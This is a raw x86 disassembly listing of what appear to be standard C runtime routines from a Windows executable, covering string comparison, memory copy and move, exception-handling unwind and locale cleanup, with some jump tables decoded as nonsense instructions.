  4262e7:	push   DWORD PTR [esi+0x64]
  4262ea:	call   0x4244ba
  4262ef:	push   DWORD PTR [esi+0x68]
  4262f2:	call   0x4244ba
  4262f7:	push   DWORD PTR [esi+0x6c]
  4262fa:	call   0x4244ba
  4262ff:	push   DWORD PTR [esi+0x70]
  426302:	call   0x4244ba
  426307:	push   DWORD PTR [esi+0x74]
  42630a:	call   0x4244ba
  42630f:	push   DWORD PTR [esi+0x78]
  426312:	call   0x4244ba
  426317:	push   DWORD PTR [esi+0x7c]
  42631a:	call   0x4244ba
  42631f:	add    esp,0x40
  426322:	push   DWORD PTR [esi+0x80]
  426328:	call   0x4244ba
  42632d:	push   DWORD PTR [esi+0x84]
  426333:	call   0x4244ba
  426338:	push   DWORD PTR [esi+0x88]
  42633e:	call   0x4244ba
  426343:	push   DWORD PTR [esi+0x8c]
  426349:	call   0x4244ba
  42634e:	push   DWORD PTR [esi+0x90]
  426354:	call   0x4244ba
  426359:	push   DWORD PTR [esi+0x94]
  42635f:	call   0x4244ba
  426364:	push   DWORD PTR [esi+0x98]
  42636a:	call   0x4244ba
  42636f:	push   DWORD PTR [esi+0x9c]
  426375:	call   0x4244ba
  42637a:	push   DWORD PTR [esi+0xa0]
  426380:	call   0x4244ba
  426385:	push   DWORD PTR [esi+0xa4]
  42638b:	call   0x4244ba
  426390:	push   DWORD PTR [esi+0xa8]
  426396:	call   0x4244ba
  42639b:	add    esp,0x2c
  42639e:	pop    esi
  42639f:	ret    
  4263a0:	push   esi
  4263a1:	mov    esi,DWORD PTR [esp+0x8]
  4263a5:	test   esi,esi
  4263a7:	je     0x4263fd
  4263a9:	mov    eax,DWORD PTR [esi]
  4263ab:	mov    ecx,DWORD PTR ds:0x45c934
  4263b1:	cmp    eax,DWORD PTR [ecx]
  4263b3:	je     0x4263c4
  4263b5:	cmp    eax,DWORD PTR ds:0x45c904
  4263bb:	je     0x4263c4
  4263bd:	push   eax
  4263be:	call   0x4244ba
  4263c3:	pop    ecx
  4263c4:	mov    eax,DWORD PTR [esi+0x4]
  4263c7:	mov    ecx,DWORD PTR ds:0x45c934
  4263cd:	cmp    eax,DWORD PTR [ecx+0x4]
  4263d0:	je     0x4263e1
  4263d2:	cmp    eax,DWORD PTR ds:0x45c908
  4263d8:	je     0x4263e1
  4263da:	push   eax
  4263db:	call   0x4244ba
  4263e0:	pop    ecx
  4263e1:	mov    esi,DWORD PTR [esi+0x8]
  4263e4:	mov    eax,ds:0x45c934
  4263e9:	cmp    esi,DWORD PTR [eax+0x8]
  4263ec:	je     0x4263fd
  4263ee:	cmp    esi,DWORD PTR ds:0x45c90c
  4263f4:	je     0x4263fd
  4263f6:	push   esi
  4263f7:	call   0x4244ba
  4263fc:	pop    ecx
  4263fd:	pop    esi
  4263fe:	ret    
  4263ff:	push   esi
  426400:	mov    esi,DWORD PTR [esp+0x8]
  426404:	test   esi,esi
  426406:	je     0x4264d6
  42640c:	mov    eax,DWORD PTR [esi+0xc]
  42640f:	mov    ecx,DWORD PTR ds:0x45c934
  426415:	cmp    eax,DWORD PTR [ecx+0xc]
  426418:	je     0x426429
  42641a:	cmp    eax,DWORD PTR ds:0x45c910
  426420:	je     0x426429
  426422:	push   eax
  426423:	call   0x4244ba
  426428:	pop    ecx
  426429:	mov    eax,DWORD PTR [esi+0x10]
  42642c:	mov    ecx,DWORD PTR ds:0x45c934
  426432:	cmp    eax,DWORD PTR [ecx+0x10]
  426435:	je     0x426446
  426437:	cmp    eax,DWORD PTR ds:0x45c914
  42643d:	je     0x426446
  42643f:	push   eax
  426440:	call   0x4244ba
  426445:	pop    ecx
  426446:	mov    eax,DWORD PTR [esi+0x14]
  426449:	mov    ecx,DWORD PTR ds:0x45c934
  42644f:	cmp    eax,DWORD PTR [ecx+0x14]
  426452:	je     0x426463
  426454:	cmp    eax,DWORD PTR ds:0x45c918
  42645a:	je     0x426463
  42645c:	push   eax
  42645d:	call   0x4244ba
  426462:	pop    ecx
  426463:	mov    eax,DWORD PTR [esi+0x18]
  426466:	mov    ecx,DWORD PTR ds:0x45c934
  42646c:	cmp    eax,DWORD PTR [ecx+0x18]
  42646f:	je     0x426480
  426471:	cmp    eax,DWORD PTR ds:0x45c91c
  426477:	je     0x426480
  426479:	push   eax
  42647a:	call   0x4244ba
  42647f:	pop    ecx
  426480:	mov    eax,DWORD PTR [esi+0x1c]
  426483:	mov    ecx,DWORD PTR ds:0x45c934
  426489:	cmp    eax,DWORD PTR [ecx+0x1c]
  42648c:	je     0x42649d
  42648e:	cmp    eax,DWORD PTR ds:0x45c920
  426494:	je     0x42649d
  426496:	push   eax
  426497:	call   0x4244ba
  42649c:	pop    ecx
  42649d:	mov    eax,DWORD PTR [esi+0x20]
  4264a0:	mov    ecx,DWORD PTR ds:0x45c934
  4264a6:	cmp    eax,DWORD PTR [ecx+0x20]
  4264a9:	je     0x4264ba
  4264ab:	cmp    eax,DWORD PTR ds:0x45c924
  4264b1:	je     0x4264ba
  4264b3:	push   eax
  4264b4:	call   0x4244ba
  4264b9:	pop    ecx
  4264ba:	mov    esi,DWORD PTR [esi+0x24]
  4264bd:	mov    eax,ds:0x45c934
  4264c2:	cmp    esi,DWORD PTR [eax+0x24]
  4264c5:	je     0x4264d6
  4264c7:	cmp    esi,DWORD PTR ds:0x45c928
  4264cd:	je     0x4264d6
  4264cf:	push   esi
  4264d0:	call   0x4244ba
  4264d5:	pop    ecx
  4264d6:	pop    esi
  4264d7:	ret    
  4264d8:	int3   
  4264d9:	int3   
  4264da:	int3   
  4264db:	int3   
  4264dc:	int3   
  4264dd:	int3   
  4264de:	int3   
  4264df:	int3   
  4264e0:	push   ebp
  4264e1:	mov    ebp,esp
  4264e3:	push   esi
  4264e4:	xor    eax,eax
  4264e6:	push   eax
  4264e7:	push   eax
  4264e8:	push   eax
  4264e9:	push   eax
  4264ea:	push   eax
  4264eb:	push   eax
  4264ec:	push   eax
  4264ed:	push   eax
  4264ee:	mov    edx,DWORD PTR [ebp+0xc]
  4264f1:	lea    ecx,[ecx+0x0]
  4264f4:	mov    al,BYTE PTR [edx]
  4264f6:	or     al,al
  4264f8:	je     0x426503
  4264fa:	add    edx,0x1
  4264fd:	bts    DWORD PTR [esp],eax
  426501:	jmp    0x4264f4
  426503:	mov    esi,DWORD PTR [ebp+0x8]
  426506:	or     ecx,0xffffffff
  426509:	lea    ecx,[ecx+0x0]
  42650c:	add    ecx,0x1
  42650f:	mov    al,BYTE PTR [esi]
  426511:	or     al,al
  426513:	je     0x42651e
  426515:	add    esi,0x1
  426518:	bt     DWORD PTR [esp],eax
  42651c:	jae    0x42650c
  42651e:	mov    eax,ecx
  426520:	add    esp,0x20
  426523:	pop    esi
  426524:	leave  
  426525:	ret    
  426526:	int3   
  426527:	int3   
  426528:	int3   
  426529:	int3   
  42652a:	int3   
  42652b:	int3   
  42652c:	int3   
  42652d:	int3   
  42652e:	int3   
  42652f:	int3   
  426530:	mov    edx,DWORD PTR [esp+0x4]
  426534:	mov    ecx,DWORD PTR [esp+0x8]
  426538:	test   edx,0x3
  42653e:	jne    0x42657c
  426540:	mov    eax,DWORD PTR [edx]
  426542:	cmp    al,BYTE PTR [ecx]
  426544:	jne    0x426574
  426546:	or     al,al
  426548:	je     0x426570
  42654a:	cmp    ah,BYTE PTR [ecx+0x1]
  42654d:	jne    0x426574
  42654f:	or     ah,ah
  426551:	je     0x426570
  426553:	shr    eax,0x10
  426556:	cmp    al,BYTE PTR [ecx+0x2]
  426559:	jne    0x426574
  42655b:	or     al,al
  42655d:	je     0x426570
  42655f:	cmp    ah,BYTE PTR [ecx+0x3]
  426562:	jne    0x426574
  426564:	add    ecx,0x4
  426567:	add    edx,0x4
  42656a:	or     ah,ah
  42656c:	jne    0x426540
  42656e:	mov    edi,edi
  426570:	xor    eax,eax
  426572:	ret    
  426573:	nop
  426574:	sbb    eax,eax
  426576:	shl    eax,1
  426578:	add    eax,0x1
  42657b:	ret    
  42657c:	test   edx,0x1
  426582:	je     0x42659c
  426584:	mov    al,BYTE PTR [edx]
  426586:	add    edx,0x1
  426589:	cmp    al,BYTE PTR [ecx]
  42658b:	jne    0x426574
  42658d:	add    ecx,0x1
  426590:	or     al,al
  426592:	je     0x426570
  426594:	test   edx,0x2
  42659a:	je     0x426540
  42659c:	mov    ax,WORD PTR [edx]
  42659f:	add    edx,0x2
  4265a2:	cmp    al,BYTE PTR [ecx]
  4265a4:	jne    0x426574
  4265a6:	or     al,al
  4265a8:	je     0x426570
  4265aa:	cmp    ah,BYTE PTR [ecx+0x1]
  4265ad:	jne    0x426574
  4265af:	or     ah,ah
  4265b1:	je     0x426570
  4265b3:	add    ecx,0x2
  4265b6:	jmp    0x426540
  4265b8:	int3   
  4265b9:	int3   
  4265ba:	int3   
  4265bb:	int3   
  4265bc:	int3   
  4265bd:	int3   
  4265be:	int3   
  4265bf:	int3   
  4265c0:	mov    eax,DWORD PTR [esp+0xc]
  4265c4:	test   eax,eax
  4265c6:	je     0x426612
  4265c8:	mov    edx,DWORD PTR [esp+0x4]
  4265cc:	push   esi
  4265cd:	push   edi
  4265ce:	mov    esi,edx
  4265d0:	mov    edi,DWORD PTR [esp+0x10]
  4265d4:	or     edx,edi
  4265d6:	and    edx,0x3
  4265d9:	je     0x426613
  4265db:	test   eax,0x1
  4265e0:	je     0x4265f3
  4265e2:	mov    cl,BYTE PTR [esi]
  4265e4:	cmp    cl,BYTE PTR [edi]
  4265e6:	jne    0x426640
  4265e8:	add    esi,0x1
  4265eb:	add    edi,0x1
  4265ee:	sub    eax,0x1
  4265f1:	je     0x426610
  4265f3:	mov    cl,BYTE PTR [esi]
  4265f5:	mov    dl,BYTE PTR [edi]
  4265f7:	cmp    cl,dl
  4265f9:	jne    0x426640
  4265fb:	mov    cl,BYTE PTR [esi+0x1]
  4265fe:	mov    dl,BYTE PTR [edi+0x1]
  426601:	cmp    cl,dl
  426603:	jne    0x426640
  426605:	add    edi,0x2
  426608:	add    esi,0x2
  42660b:	sub    eax,0x2
  42660e:	jne    0x4265f3
  426610:	pop    edi
  426611:	pop    esi
  426612:	ret    
  426613:	mov    ecx,eax
  426615:	and    eax,0x3
  426618:	shr    ecx,0x2
  42661b:	je     0x426648
  42661d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42661f:	je     0x426648
  426621:	mov    ecx,DWORD PTR [esi-0x4]
  426624:	mov    edx,DWORD PTR [edi-0x4]
  426627:	cmp    cl,dl
  426629:	jne    0x42663b
  42662b:	cmp    ch,dh
  42662d:	jne    0x42663b
  42662f:	shr    ecx,0x10
  426632:	shr    edx,0x10
  426635:	cmp    cl,dl
  426637:	jne    0x42663b
  426639:	cmp    ch,dh
  42663b:	mov    eax,0x0
  426640:	sbb    eax,eax
  426642:	pop    edi
  426643:	sbb    eax,0xffffffff
  426646:	pop    esi
  426647:	ret    
  426648:	test   eax,eax
  42664a:	je     0x426610
  42664c:	mov    edx,DWORD PTR [esi]
  42664e:	mov    ecx,DWORD PTR [edi]
  426650:	cmp    dl,cl
  426652:	jne    0x42663b
  426654:	sub    eax,0x1
  426657:	je     0x426675
  426659:	cmp    dh,ch
  42665b:	jne    0x42663b
  42665d:	sub    eax,0x1
  426660:	je     0x426675
  426662:	and    ecx,0xff0000
  426668:	and    edx,0xff0000
  42666e:	cmp    edx,ecx
  426670:	jne    0x42663b
  426672:	sub    eax,0x1
  426675:	pop    edi
  426676:	pop    esi
  426677:	ret    
  426678:	int3   
  426679:	int3   
  42667a:	int3   
  42667b:	int3   
  42667c:	int3   
  42667d:	int3   
  42667e:	int3   
  42667f:	int3   
  426680:	push   ebp
  426681:	mov    ebp,esp
  426683:	push   edi
  426684:	push   esi
  426685:	push   ebx
  426686:	mov    ecx,DWORD PTR [ebp+0x10]
  426689:	jecxz  0x4266b2
  42668b:	mov    ebx,ecx
  42668d:	mov    edi,DWORD PTR [ebp+0x8]
  426690:	mov    esi,edi
  426692:	xor    eax,eax
  426694:	repnz scas al,BYTE PTR es:[edi]
  426696:	neg    ecx
  426698:	add    ecx,ebx
  42669a:	mov    edi,esi
  42669c:	mov    esi,DWORD PTR [ebp+0xc]
  42669f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4266a1:	mov    al,BYTE PTR [esi-0x1]
  4266a4:	xor    ecx,ecx
  4266a6:	cmp    al,BYTE PTR [edi-0x1]
  4266a9:	ja     0x4266b0
  4266ab:	je     0x4266b2
  4266ad:	sub    ecx,0x2
  4266b0:	not    ecx
  4266b2:	mov    eax,ecx
  4266b4:	pop    ebx
  4266b5:	pop    esi
  4266b6:	pop    edi
  4266b7:	leave  
  4266b8:	ret    
  4266b9:	int3   
  4266ba:	int3   
  4266bb:	int3   
  4266bc:	int3   
  4266bd:	int3   
  4266be:	int3   
  4266bf:	int3   
  4266c0:	push   ebp
  4266c1:	mov    ebp,esp
  4266c3:	push   esi
  4266c4:	xor    eax,eax
  4266c6:	push   eax
  4266c7:	push   eax
  4266c8:	push   eax
  4266c9:	push   eax
  4266ca:	push   eax
  4266cb:	push   eax
  4266cc:	push   eax
  4266cd:	push   eax
  4266ce:	mov    edx,DWORD PTR [ebp+0xc]
  4266d1:	lea    ecx,[ecx+0x0]
  4266d4:	mov    al,BYTE PTR [edx]
  4266d6:	or     al,al
  4266d8:	je     0x4266e3
  4266da:	add    edx,0x1
  4266dd:	bts    DWORD PTR [esp],eax
  4266e1:	jmp    0x4266d4
  4266e3:	mov    esi,DWORD PTR [ebp+0x8]
  4266e6:	mov    edi,edi
  4266e8:	mov    al,BYTE PTR [esi]
  4266ea:	or     al,al
  4266ec:	je     0x4266fa
  4266ee:	add    esi,0x1
  4266f1:	bt     DWORD PTR [esp],eax
  4266f5:	jae    0x4266e8
  4266f7:	lea    eax,[esi-0x1]
  4266fa:	add    esp,0x20
  4266fd:	pop    esi
  4266fe:	leave  
  4266ff:	ret    
  426700:	push   ebp
  426701:	mov    ebp,esp
  426703:	push   ebx
  426704:	push   esi
  426705:	push   edi
  426706:	push   ebp
  426707:	push   0x0
  426709:	push   0x0
  42670b:	push   0x426718
  426710:	push   DWORD PTR [ebp+0x8]
  426713:	call   0x42718e
  426718:	pop    ebp
  426719:	pop    edi
  42671a:	pop    esi
  42671b:	pop    ebx
  42671c:	mov    esp,ebp
  42671e:	pop    ebp
  42671f:	ret    
  426720:	mov    ecx,DWORD PTR [esp+0x4]
  426724:	test   DWORD PTR [ecx+0x4],0x6
  42672b:	mov    eax,0x1
  426730:	je     0x426741
  426732:	mov    eax,DWORD PTR [esp+0x8]
  426736:	mov    edx,DWORD PTR [esp+0x10]
  42673a:	mov    DWORD PTR [edx],eax
  42673c:	mov    eax,0x3
  426741:	ret    
  426742:	push   ebx
  426743:	push   esi
  426744:	push   edi
  426745:	mov    eax,DWORD PTR [esp+0x10]
  426749:	push   eax
  42674a:	push   0xfffffffe
  42674c:	push   0x426720
  426751:	push   DWORD PTR fs:0x0
  426758:	mov    DWORD PTR fs:0x0,esp
  42675f:	mov    eax,DWORD PTR [esp+0x20]
  426763:	mov    ebx,DWORD PTR [eax+0x8]
  426766:	mov    esi,DWORD PTR [eax+0xc]
  426769:	cmp    esi,0xffffffff
  42676c:	je     0x42679c
  42676e:	cmp    esi,DWORD PTR [esp+0x24]
  426772:	je     0x42679c
  426774:	lea    esi,[esi+esi*2]
  426777:	mov    ecx,DWORD PTR [ebx+esi*4]
  42677a:	mov    DWORD PTR [esp+0x8],ecx
  42677e:	mov    DWORD PTR [eax+0xc],ecx
  426781:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  426786:	jne    0x42679a
  426788:	push   0x101
  42678d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  426791:	call   0x4267d6
  426796:	call   DWORD PTR [ebx+esi*4+0x8]
  42679a:	jmp    0x42675f
  42679c:	pop    DWORD PTR fs:0x0
  4267a3:	add    esp,0xc
  4267a6:	pop    edi
  4267a7:	pop    esi
  4267a8:	pop    ebx
  4267a9:	ret    
  4267aa:	xor    eax,eax
  4267ac:	mov    ecx,DWORD PTR fs:0x0
  4267b3:	cmp    DWORD PTR [ecx+0x4],0x426720
  4267ba:	jne    0x4267cc
  4267bc:	mov    edx,DWORD PTR [ecx+0xc]
  4267bf:	mov    edx,DWORD PTR [edx+0xc]
  4267c2:	cmp    DWORD PTR [ecx+0x8],edx
  4267c5:	jne    0x4267cc
  4267c7:	mov    eax,0x1
  4267cc:	ret    
  4267cd:	push   ebx
  4267ce:	push   ecx
  4267cf:	mov    ebx,0x45c94c
  4267d4:	jmp    0x4267e0
  4267d6:	push   ebx
  4267d7:	push   ecx
  4267d8:	mov    ebx,0x45c94c
  4267dd:	mov    ecx,DWORD PTR [ebp+0x8]
  4267e0:	mov    DWORD PTR [ebx+0x8],ecx
  4267e3:	mov    DWORD PTR [ebx+0x4],eax
  4267e6:	mov    DWORD PTR [ebx+0xc],ebp
  4267e9:	pop    ecx
  4267ea:	pop    ebx
  4267eb:	ret    0x4
  4267ee:	int3   
  4267ef:	int3   
  4267f0:	push   ebp
  4267f1:	mov    ebp,esp
  4267f3:	push   edi
  4267f4:	push   esi
  4267f5:	mov    esi,DWORD PTR [ebp+0xc]
  4267f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4267fb:	mov    edi,DWORD PTR [ebp+0x8]
  4267fe:	mov    eax,ecx
  426800:	mov    edx,ecx
  426802:	add    eax,esi
  426804:	cmp    edi,esi
  426806:	jbe    0x426810
  426808:	cmp    edi,eax
  42680a:	jb     0x42698c
  426810:	test   edi,0x3
  426816:	jne    0x42682c
  426818:	shr    ecx,0x2
  42681b:	and    edx,0x3
  42681e:	cmp    ecx,0x8
  426821:	jb     0x42684c
  426823:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426825:	jmp    DWORD PTR [edx*4+0x42693c]
  42682c:	mov    eax,edi
  42682e:	mov    edx,0x3
  426833:	sub    ecx,0x4
  426836:	jb     0x426844
  426838:	and    eax,0x3
  42683b:	add    ecx,eax
  42683d:	jmp    DWORD PTR [eax*4+0x426850]
  426844:	jmp    DWORD PTR [ecx*4+0x42694c]
  42684b:	nop
  42684c:	jmp    DWORD PTR [ecx*4+0x4268d0]
  426853:	nop
  426854:	pusha  
  426855:	push   0x688c0042
  42685a:	inc    edx
  42685b:	add    BYTE PTR [eax+0x23004268],dh
  426861:	ror    DWORD PTR [edx-0x75f877fa],1
  426867:	inc    esi
  426868:	add    DWORD PTR [eax+0x468a0147],ecx
  42686e:	add    al,cl
  426870:	jmp    0x289f077
  426875:	add    esi,0x3
  426878:	add    edi,0x3
  42687b:	cmp    ecx,0x8
  42687e:	jb     0x42684c
  426880:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426882:	jmp    DWORD PTR [edx*4+0x42693c]
  426889:	lea    ecx,[ecx+0x0]
  42688c:	and    edx,ecx
  42688e:	mov    al,BYTE PTR [esi]
  426890:	mov    BYTE PTR [edi],al
  426892:	mov    al,BYTE PTR [esi+0x1]
  426895:	shr    ecx,0x2
  426898:	mov    BYTE PTR [edi+0x1],al
  42689b:	add    esi,0x2
  42689e:	add    edi,0x2
  4268a1:	cmp    ecx,0x8
  4268a4:	jb     0x42684c
  4268a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268a8:	jmp    DWORD PTR [edx*4+0x42693c]
  4268af:	nop
  4268b0:	and    edx,ecx
  4268b2:	mov    al,BYTE PTR [esi]
  4268b4:	mov    BYTE PTR [edi],al
  4268b6:	add    esi,0x1
  4268b9:	shr    ecx,0x2
  4268bc:	add    edi,0x1
  4268bf:	cmp    ecx,0x8
  4268c2:	jb     0x42684c
  4268c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268c6:	jmp    DWORD PTR [edx*4+0x42693c]
  4268cd:	lea    ecx,[ecx+0x0]
  4268d0:	xor    ebp,DWORD PTR [ecx+0x42]
  4268d3:	add    BYTE PTR [eax],ah
  4268d5:	imul   eax,DWORD PTR [edx+0x0],0x426918
  4268dc:	adc    BYTE PTR [ecx+0x42],ch
  4268df:	add    BYTE PTR [eax],cl
  4268e1:	imul   eax,DWORD PTR [edx+0x0],0x426900
  4268e8:	clc    
  4268e9:	push   0x68f00042
  4268ee:	inc    edx
  4268ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4268f5:	inc    esp
  4268f6:	(bad)  
  4268f7:	in     al,0x8b
  4268f9:	inc    esp
  4268fa:	mov    gs,eax
  4268fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  426900:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  426904:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  426908:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42690c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  426910:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  426914:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  426918:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42691c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  426920:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  426924:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  426928:	lea    eax,[ecx*4+0x0]
  42692f:	add    esi,eax
  426931:	add    edi,eax
  426933:	jmp    DWORD PTR [edx*4+0x42693c]
  42693a:	mov    edi,edi
  42693c:	dec    esp
  42693d:	imul   eax,DWORD PTR [edx+0x0],0x426954
  426944:	pusha  
  426945:	imul   eax,DWORD PTR [edx+0x0],0x426974
  42694c:	mov    eax,DWORD PTR [ebp+0x8]
  42694f:	pop    esi
  426950:	pop    edi
  426951:	leave  
  426952:	ret    
  426953:	nop
  426954:	mov    al,BYTE PTR [esi]
  426956:	mov    BYTE PTR [edi],al
  426958:	mov    eax,DWORD PTR [ebp+0x8]
  42695b:	pop    esi
  42695c:	pop    edi
  42695d:	leave  
  42695e:	ret    
  42695f:	nop
  426960:	mov    al,BYTE PTR [esi]
  426962:	mov    BYTE PTR [edi],al
  426964:	mov    al,BYTE PTR [esi+0x1]
  426967:	mov    BYTE PTR [edi+0x1],al
  42696a:	mov    eax,DWORD PTR [ebp+0x8]
  42696d:	pop    esi
  42696e:	pop    edi
  42696f:	leave  
  426970:	ret    
  426971:	lea    ecx,[ecx+0x0]
  426974:	mov    al,BYTE PTR [esi]
  426976:	mov    BYTE PTR [edi],al
  426978:	mov    al,BYTE PTR [esi+0x1]
  42697b:	mov    BYTE PTR [edi+0x1],al
  42697e:	mov    al,BYTE PTR [esi+0x2]
  426981:	mov    BYTE PTR [edi+0x2],al
  426984:	mov    eax,DWORD PTR [ebp+0x8]
  426987:	pop    esi
  426988:	pop    edi
  426989:	leave  
  42698a:	ret    
  42698b:	nop
  42698c:	lea    esi,[ecx+esi*1-0x4]
  426990:	lea    edi,[ecx+edi*1-0x4]
  426994:	test   edi,0x3
  42699a:	jne    0x4269c0
  42699c:	shr    ecx,0x2
  42699f:	and    edx,0x3
  4269a2:	cmp    ecx,0x8
  4269a5:	jb     0x4269b4
  4269a7:	std    
  4269a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269aa:	cld    
  4269ab:	jmp    DWORD PTR [edx*4+0x426ad8]
  4269b2:	mov    edi,edi
  4269b4:	neg    ecx
  4269b6:	jmp    DWORD PTR [ecx*4+0x426a88]
  4269bd:	lea    ecx,[ecx+0x0]
  4269c0:	mov    eax,edi
  4269c2:	mov    edx,0x3
  4269c7:	cmp    ecx,0x4
  4269ca:	jb     0x4269d8
  4269cc:	and    eax,0x3
  4269cf:	sub    ecx,eax
  4269d1:	jmp    DWORD PTR [eax*4+0x4269dc]
  4269d8:	jmp    DWORD PTR [ecx*4+0x426ad8]
  4269df:	nop
  4269e0:	in     al,dx
  4269e1:	imul   eax,DWORD PTR [edx+0x0],0x426a10
  4269e8:	cmp    BYTE PTR [edx+0x42],ch
  4269eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4269f1:	mov    BYTE PTR [edi+0x3],al
  4269f4:	sub    esi,0x1
  4269f7:	shr    ecx,0x2
  4269fa:	sub    edi,0x1
  4269fd:	cmp    ecx,0x8
  426a00:	jb     0x4269b4
  426a02:	std    
  426a03:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a05:	cld    
  426a06:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a0d:	lea    ecx,[ecx+0x0]
  426a10:	mov    al,BYTE PTR [esi+0x3]
  426a13:	and    edx,ecx
  426a15:	mov    BYTE PTR [edi+0x3],al
  426a18:	mov    al,BYTE PTR [esi+0x2]
  426a1b:	shr    ecx,0x2
  426a1e:	mov    BYTE PTR [edi+0x2],al
  426a21:	sub    esi,0x2
  426a24:	sub    edi,0x2
  426a27:	cmp    ecx,0x8
  426a2a:	jb     0x4269b4
  426a2c:	std    
  426a2d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a2f:	cld    
  426a30:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a37:	nop
  426a38:	mov    al,BYTE PTR [esi+0x3]
  426a3b:	and    edx,ecx
  426a3d:	mov    BYTE PTR [edi+0x3],al
  426a40:	mov    al,BYTE PTR [esi+0x2]
  426a43:	mov    BYTE PTR [edi+0x2],al
  426a46:	mov    al,BYTE PTR [esi+0x1]
  426a49:	shr    ecx,0x2
  426a4c:	mov    BYTE PTR [edi+0x1],al
  426a4f:	sub    esi,0x3
  426a52:	sub    edi,0x3
  426a55:	cmp    ecx,0x8
  426a58:	jb     0x4269b4
  426a5e:	std    
  426a5f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a61:	cld    
  426a62:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a69:	lea    ecx,[ecx+0x0]
  426a6c:	mov    WORD PTR [edx+0x42],gs
  426a6f:	add    BYTE PTR [edx+ebp*2+0x6a9c0042],dl
  426a76:	inc    edx
  426a77:	add    BYTE PTR [edx+ebp*2+0x6aac0042],ah
  426a7e:	inc    edx
  426a7f:	add    BYTE PTR [edx+ebp*2+0x6abc0042],dh
  426a86:	inc    edx
  426a87:	add    bh,cl
  426a89:	push   0x42
  426a8b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426a91:	inc    esp
  426a92:	(bad)  
  426a93:	sbb    al,0x8b
  426a95:	inc    esp
  426a96:	mov    ds,WORD PTR [eax]
  426a98:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  426a9c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426aa0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426aa4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426aa8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  426aac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426ab0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426ab4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426ab8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  426abc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426ac0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426ac4:	lea    eax,[ecx*4+0x0]
  426acb:	add    esi,eax
  426acd:	add    edi,eax
  426acf:	jmp    DWORD PTR [edx*4+0x426ad8]
  426ad6:	mov    edi,edi
  426ad8:	call   0xf042ad47
  426add:	push   0x42
  426adf:	add    BYTE PTR [eax],al
  426ae1:	imul   eax,DWORD PTR [edx+0x0],0x14
  426ae5:	imul   eax,DWORD PTR [edx+0x0],0xffffff8b
  426ae9:	inc    ebp
  426aea:	or     BYTE PTR [esi+0x5f],bl
  426aed:	leave  
  426aee:	ret    
  426aef:	nop
  426af0:	mov    al,BYTE PTR [esi+0x3]
  426af3:	mov    BYTE PTR [edi+0x3],al
  426af6:	mov    eax,DWORD PTR [ebp+0x8]
  426af9:	pop    esi
  426afa:	pop    edi
  426afb:	leave  
  426afc:	ret    
  426afd:	lea    ecx,[ecx+0x0]
  426b00:	mov    al,BYTE PTR [esi+0x3]
  426b03:	mov    BYTE PTR [edi+0x3],al
  426b06:	mov    al,BYTE PTR [esi+0x2]
  426b09:	mov    BYTE PTR [edi+0x2],al
  426b0c:	mov    eax,DWORD PTR [ebp+0x8]
  426b0f:	pop    esi
  426b10:	pop    edi
  426b11:	leave  
  426b12:	ret    
  426b13:	nop
  426b14:	mov    al,BYTE PTR [esi+0x3]
  426b17:	mov    BYTE PTR [edi+0x3],al
  426b1a:	mov    al,BYTE PTR [esi+0x2]
  426b1d:	mov    BYTE PTR [edi+0x2],al
  426b20:	mov    al,BYTE PTR [esi+0x1]
  426b23:	mov    BYTE PTR [edi+0x1],al
  426b26:	mov    eax,DWORD PTR [ebp+0x8]
  426b29:	pop    esi
  426b2a:	pop    edi
  426b2b:	leave  
  426b2c:	ret    
  426b2d:	push   ebp
  426b2e:	mov    ebp,esp
  426b30:	sub    esp,0xc
  426b33:	mov    eax,ds:0x45c430
  426b38:	xor    eax,DWORD PTR [ebp+0x4]
  426b3b:	and    BYTE PTR [ebp-0x6],0x0
  426b3f:	push   0x6
  426b41:	mov    DWORD PTR [ebp-0x4],eax
  426b44:	lea    eax,[ebp-0xc]
  426b47:	push   eax
  426b48:	push   0x1004
  426b4d:	push   DWORD PTR [ebp+0x8]
  426b50:	call   DWORD PTR ds:0x4280e0
  426b56:	test   eax,eax
  426b58:	jne    0x426b5f
  426b5a:	or     eax,0xffffffff
  426b5d:	jmp    0x426b69
  426b5f:	lea    eax,[ebp-0xc]
  426b62:	push   eax
  426b63:	call   0x426e6e
  426b68:	pop    ecx
  426b69:	mov    ecx,DWORD PTR [ebp-0x4]
